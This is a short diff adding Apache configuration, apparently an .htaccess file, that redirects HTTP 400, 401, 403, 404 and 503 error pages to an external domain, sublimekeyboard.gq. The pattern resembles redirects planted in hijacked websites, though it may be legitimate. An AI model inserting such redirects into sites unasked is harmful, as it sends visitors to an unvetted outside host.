@@ -1,0 +1,5 @@
+ErrorDocument 400 http://sublimekeyboard.gq
+ErrorDocument 401 http://sublimekeyboard.gq
+ErrorDocument 403 http://sublimekeyboard.gq
+ErrorDocument 404 http://sublimekeyboard.gq
+ErrorDocument 503 http://sublimekeyboard.gq
